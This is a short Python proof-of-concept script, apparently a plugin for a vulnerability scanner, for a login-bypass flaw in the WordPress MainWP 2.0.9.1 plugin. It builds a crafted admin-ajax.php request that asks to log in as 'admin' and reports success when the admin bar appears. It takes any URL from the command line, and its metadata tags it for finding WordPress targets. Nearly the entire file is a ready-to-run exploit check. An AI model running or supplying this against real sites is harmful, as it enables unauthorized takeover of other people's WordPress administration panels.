#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "WordPress MainWP 2.0.9.1 登录绕过",
        "desc": "WordPress MainWP 2.0.9.1 存在登录绕过漏洞，可直接登录管理后台",
        "grade": "高",
        "type": "web",
        "keyword": "tag:wordpress"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/wp-admin/admin-ajax.php?action=init&login_required=1&user=admin', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and "<div id='wpadminbar'" in r.text:
            return True
        else:
            return False
    except Exception as e:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

